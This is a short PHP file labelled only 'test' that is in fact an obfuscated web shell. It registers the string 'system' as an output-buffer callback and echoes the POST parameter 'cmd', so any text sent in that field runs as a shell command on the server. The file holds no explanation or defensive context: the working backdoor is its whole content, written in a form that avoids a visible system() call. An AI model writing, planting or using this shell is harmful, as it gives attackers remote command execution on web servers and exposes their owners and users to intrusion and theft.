<?
//test
$a = 'system';

ob_start($a);

echo "$_POST[cmd]";

ob_end_flush();
